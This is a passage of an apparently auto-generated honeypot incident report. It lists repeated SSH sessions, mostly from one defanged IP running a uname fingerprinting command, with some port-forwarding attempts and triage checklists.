| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:27` | `cowrie.session.connect` |
| `2026-08-15 20:23:27` | `cowrie.client.version` |
| `2026-08-15 20:23:27` | `cowrie.client.kex` |
| `2026-08-15 20:23:28` | `cowrie.login.success` |
| `2026-08-15 20:23:29` | `cowrie.session.params` |
| `2026-08-15 20:23:29` | `cowrie.command.input` |
| `2026-08-15 20:23:29` | `cowrie.log.closed` |
| `2026-08-15 20:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cab402aa50c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:32` | `cowrie.session.connect` |
| `2026-08-15 20:23:32` | `cowrie.client.version` |
| `2026-08-15 20:23:32` | `cowrie.client.kex` |
| `2026-08-15 20:23:32` | `cowrie.login.success` |
| `2026-08-15 20:23:33` | `cowrie.session.params` |
| `2026-08-15 20:23:33` | `cowrie.command.input` |
| `2026-08-15 20:23:33` | `cowrie.log.closed` |
| `2026-08-15 20:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab8d6c2cadb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:37` | `cowrie.session.connect` |
| `2026-08-15 20:23:37` | `cowrie.client.version` |
| `2026-08-15 20:23:37` | `cowrie.client.kex` |
| `2026-08-15 20:23:38` | `cowrie.login.success` |
| `2026-08-15 20:23:39` | `cowrie.session.params` |
| `2026-08-15 20:23:39` | `cowrie.command.input` |
| `2026-08-15 20:23:39` | `cowrie.log.closed` |
| `2026-08-15 20:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ad9c87e422

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:42` | `cowrie.session.connect` |
| `2026-08-15 20:23:42` | `cowrie.client.version` |
| `2026-08-15 20:23:43` | `cowrie.client.kex` |
| `2026-08-15 20:23:43` | `cowrie.login.success` |
| `2026-08-15 20:23:44` | `cowrie.session.params` |
| `2026-08-15 20:23:44` | `cowrie.command.input` |
| `2026-08-15 20:23:44` | `cowrie.log.closed` |
| `2026-08-15 20:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e6275a0e7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:47` | `cowrie.session.connect` |
| `2026-08-15 20:23:47` | `cowrie.client.version` |
| `2026-08-15 20:23:47` | `cowrie.client.kex` |
| `2026-08-15 20:23:48` | `cowrie.login.success` |
| `2026-08-15 20:23:49` | `cowrie.session.params` |
| `2026-08-15 20:23:49` | `cowrie.command.input` |
| `2026-08-15 20:23:49` | `cowrie.log.closed` |
| `2026-08-15 20:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b96f67eb474

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:52` | `cowrie.session.connect` |
| `2026-08-15 20:23:53` | `cowrie.client.version` |
| `2026-08-15 20:23:53` | `cowrie.client.kex` |
| `2026-08-15 20:23:53` | `cowrie.login.success` |
| `2026-08-15 20:23:54` | `cowrie.session.params` |
| `2026-08-15 20:23:54` | `cowrie.command.input` |
| `2026-08-15 20:23:54` | `cowrie.log.closed` |
| `2026-08-15 20:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fce3d8f9c9be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:57` | `cowrie.session.connect` |
| `2026-08-15 20:23:57` | `cowrie.client.version` |
| `2026-08-15 20:23:58` | `cowrie.client.kex` |
| `2026-08-15 20:23:58` | `cowrie.login.success` |
| `2026-08-15 20:23:59` | `cowrie.session.params` |
| `2026-08-15 20:23:59` | `cowrie.command.input` |
| `2026-08-15 20:23:59` | `cowrie.log.closed` |
| `2026-08-15 20:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8171580cfee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:03` | `cowrie.session.connect` |
| `2026-08-15 20:24:03` | `cowrie.client.version` |
| `2026-08-15 20:24:03` | `cowrie.client.kex` |
| `2026-08-15 20:24:03` | `cowrie.login.success` |
| `2026-08-15 20:24:04` | `cowrie.session.params` |
| `2026-08-15 20:24:04` | `cowrie.command.input` |
| `2026-08-15 20:24:04` | `cowrie.log.closed` |
| `2026-08-15 20:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e060b3d6ca5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:08` | `cowrie.session.connect` |
| `2026-08-15 20:24:08` | `cowrie.client.version` |
| `2026-08-15 20:24:08` | `cowrie.client.kex` |
| `2026-08-15 20:24:08` | `cowrie.login.success` |
| `2026-08-15 20:24:09` | `cowrie.session.params` |
| `2026-08-15 20:24:09` | `cowrie.command.input` |
| `2026-08-15 20:24:09` | `cowrie.log.closed` |
| `2026-08-15 20:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de9d87e86c0

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:13` | `cowrie.session.connect` |
| `2026-08-15 20:24:19` | `cowrie.client.version` |
| `2026-08-15 20:24:19` | `cowrie.client.kex` |
| `2026-08-15 20:24:42` | `cowrie.login.success` |
| `2026-08-15 20:24:54` | `cowrie.session.params` |
| `2026-08-15 20:24:54` | `cowrie.command.input` |
| `2026-08-15 20:24:59` | `cowrie.log.closed` |
| `2026-08-15 20:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f87bbec796a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:13` | `cowrie.session.connect` |
| `2026-08-15 20:24:13` | `cowrie.client.version` |
| `2026-08-15 20:24:13` | `cowrie.client.kex` |
| `2026-08-15 20:24:14` | `cowrie.login.success` |
| `2026-08-15 20:24:15` | `cowrie.session.params` |
| `2026-08-15 20:24:15` | `cowrie.command.input` |
| `2026-08-15 20:24:15` | `cowrie.log.closed` |
| `2026-08-15 20:24:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3621c0b00fd4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:19` | `cowrie.session.connect` |
| `2026-08-15 20:24:19` | `cowrie.client.version` |
| `2026-08-15 20:24:19` | `cowrie.client.kex` |
| `2026-08-15 20:24:20` | `cowrie.login.success` |
| `2026-08-15 20:24:21` | `cowrie.session.params` |
| `2026-08-15 20:24:21` | `cowrie.command.input` |
| `2026-08-15 20:24:21` | `cowrie.log.closed` |
| `2026-08-15 20:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b729ba2e54

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:19` | `cowrie.session.connect` |
| `2026-08-15 20:24:21` | `cowrie.client.version` |
| `2026-08-15 20:24:21` | `cowrie.client.kex` |
| `2026-08-15 20:24:23` | `cowrie.login.success` |
| `2026-08-15 20:24:23` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4a9df7b3a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:24` | `cowrie.session.connect` |
| `2026-08-15 20:24:24` | `cowrie.client.version` |
| `2026-08-15 20:24:24` | `cowrie.client.kex` |
| `2026-08-15 20:24:25` | `cowrie.login.success` |
| `2026-08-15 20:24:26` | `cowrie.session.params` |
| `2026-08-15 20:24:26` | `cowrie.command.input` |
| `2026-08-15 20:24:26` | `cowrie.log.closed` |
| `2026-08-15 20:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee94eda85f0

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:28` | `cowrie.session.connect` |
| `2026-08-15 20:24:29` | `cowrie.client.version` |
| `2026-08-15 20:24:29` | `cowrie.client.kex` |
| `2026-08-15 20:24:29` | `cowrie.login.success` |
| `2026-08-15 20:24:30` | `cowrie.direct-tcpip.request` |
| `2026-08-15 20:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0275323d48dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:29` | `cowrie.session.connect` |
| `2026-08-15 20:24:29` | `cowrie.client.version` |
| `2026-08-15 20:24:29` | `cowrie.client.kex` |
| `2026-08-15 20:24:30` | `cowrie.login.success` |
| `2026-08-15 20:24:31` | `cowrie.session.params` |
| `2026-08-15 20:24:31` | `cowrie.command.input` |
| `2026-08-15 20:24:31` | `cowrie.log.closed` |
| `2026-08-15 20:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50038382810

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:34` | `cowrie.session.connect` |
| `2026-08-15 20:24:34` | `cowrie.client.version` |
| `2026-08-15 20:24:35` | `cowrie.client.kex` |
| `2026-08-15 20:24:35` | `cowrie.login.success` |
| `2026-08-15 20:24:36` | `cowrie.session.params` |
| `2026-08-15 20:24:36` | `cowrie.command.input` |
| `2026-08-15 20:24:37` | `cowrie.log.closed` |
| `2026-08-15 20:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ec2f5204c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:40` | `cowrie.session.connect` |
| `2026-08-15 20:24:40` | `cowrie.client.version` |
| `2026-08-15 20:24:40` | `cowrie.client.kex` |
| `2026-08-15 20:24:40` | `cowrie.login.success` |
| `2026-08-15 20:24:41` | `cowrie.session.params` |
| `2026-08-15 20:24:41` | `cowrie.command.input` |
| `2026-08-15 20:24:41` | `cowrie.log.closed` |
| `2026-08-15 20:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76d116d75edb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:45` | `cowrie.session.connect` |
| `2026-08-15 20:24:45` | `cowrie.client.version` |
| `2026-08-15 20:24:45` | `cowrie.client.kex` |
| `2026-08-15 20:24:46` | `cowrie.login.success` |
| `2026-08-15 20:24:46` | `cowrie.session.params` |
| `2026-08-15 20:24:46` | `cowrie.command.input` |
| `2026-08-15 20:24:47` | `cowrie.log.closed` |
| `2026-08-15 20:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45dea8ea8e04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:50` | `cowrie.session.connect` |
| `2026-08-15 20:24:50` | `cowrie.client.version` |
| `2026-08-15 20:24:50` | `cowrie.client.kex` |
| `2026-08-15 20:24:51` | `cowrie.login.success` |
| `2026-08-15 20:24:52` | `cowrie.session.params` |
| `2026-08-15 20:24:52` | `cowrie.command.input` |
| `2026-08-15 20:24:53` | `cowrie.log.closed` |
| `2026-08-15 20:24:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f2eaf29d17

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:24 |
| **Last Seen** | 2026-08-15 20:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:24:55` | `cowrie.session.connect` |
| `2026-08-15 20:24:56` | `cowrie.client.version` |
| `2026-08-15 20:24:56` | `cowrie.client.kex` |
| `2026-08-15 20:24:56` | `cowrie.login.success` |
| `2026-08-15 20:24:57` | `cowrie.session.params` |
| `2026-08-15 20:24:57` | `cowrie.command.input` |
| `2026-08-15 20:24:57` | `cowrie.log.closed` |
| `2026-08-15 20:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287f32c23ae1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:01` | `cowrie.session.connect` |
| `2026-08-15 20:25:01` | `cowrie.client.version` |
| `2026-08-15 20:25:01` | `cowrie.client.kex` |
| `2026-08-15 20:25:01` | `cowrie.login.success` |
| `2026-08-15 20:25:02` | `cowrie.session.params` |
| `2026-08-15 20:25:02` | `cowrie.command.input` |
| `2026-08-15 20:25:03` | `cowrie.log.closed` |
| `2026-08-15 20:25:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e42a301b5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:06` | `cowrie.session.connect` |
| `2026-08-15 20:25:06` | `cowrie.client.version` |
| `2026-08-15 20:25:06` | `cowrie.client.kex` |
| `2026-08-15 20:25:07` | `cowrie.login.success` |
| `2026-08-15 20:25:08` | `cowrie.session.params` |
| `2026-08-15 20:25:08` | `cowrie.command.input` |
| `2026-08-15 20:25:08` | `cowrie.log.closed` |
| `2026-08-15 20:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20a0da36c691

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:11` | `cowrie.session.connect` |
| `2026-08-15 20:25:11` | `cowrie.client.version` |
| `2026-08-15 20:25:11` | `cowrie.client.kex` |
| `2026-08-15 20:25:12` | `cowrie.login.success` |
| `2026-08-15 20:25:13` | `cowrie.session.params` |
| `2026-08-15 20:25:13` | `cowrie.command.input` |
| `2026-08-15 20:25:13` | `cowrie.log.closed` |
| `2026-08-15 20:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e59ad28fca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:16` | `cowrie.session.connect` |
| `2026-08-15 20:25:16` | `cowrie.client.version` |
| `2026-08-15 20:25:16` | `cowrie.client.kex` |
| `2026-08-15 20:25:17` | `cowrie.login.success` |
| `2026-08-15 20:25:18` | `cowrie.session.params` |
| `2026-08-15 20:25:18` | `cowrie.command.input` |
| `2026-08-15 20:25:18` | `cowrie.log.closed` |
| `2026-08-15 20:25:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b80a037430

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:25 |
| **Last Seen** | 2026-08-15 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:25:21` | `cowrie.session.connect` |
| `2026-08-15 20:25:21` | `cowrie.client.version` |
| `2026-08-15 20:25:21` | `cowrie.client.kex` |
| `2026-08-15 20:25:22` | `cowrie.login.success` |
| `2026-08-15 20:25:23` | `cowrie.session.params` |
| `2026-08-15 20:25:23` | `cowrie.command.input` |
| `2026-08-15 20:25:23` | `cowrie.log.closed` |
